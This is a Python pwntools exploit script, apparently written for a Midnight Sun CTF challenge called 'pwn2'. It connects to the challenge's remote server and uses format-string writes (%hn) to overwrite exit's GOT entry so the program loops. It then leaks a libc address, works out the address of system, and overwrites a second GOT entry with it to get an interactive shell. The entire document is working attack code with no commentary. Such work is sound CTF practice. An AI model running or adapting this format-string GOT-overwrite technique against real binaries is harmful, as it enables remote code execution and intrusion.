from pwn import *
#0x8048688

exit_got=0x804b020
entry=0x80484a0
#p=process("./pwn2")
p=remote("pwn2-01.play.midnightsunctf.se",10002)
first=entry& 0xffff
second=((entry>>16)&0xffff )- first
if second <0:
	second +=0x10000
payload=""
payload+=p32(exit_got)
payload+=p32(exit_got+2)
payload+="%"+str(first-8)+"x"
payload+="%7$hn"
payload+="%"+str(second)+"x"
payload+="%8$hn"
p.sendline(payload)
p.sendline("%27$x")
p.recvuntil("input:")
p.recvuntil("input:")
data=int(p.recvline()[1:-1],16)
base=data-0x018e81
system=base+0x03cd10
print hex(data)
first=system& 0xffff
second=((system>>16)&0xffff )- first
if second <0:
	second +=0x10000
payload=""
payload+=p32(0x804b00c)
payload+=p32(0x804b00c+2)
payload+="%"+str(first-8)+"x"
payload+="%7$hn"
payload+="%"+str(second)+"x"
payload+="%8$hn"
p.sendline(payload)
p.interactive()
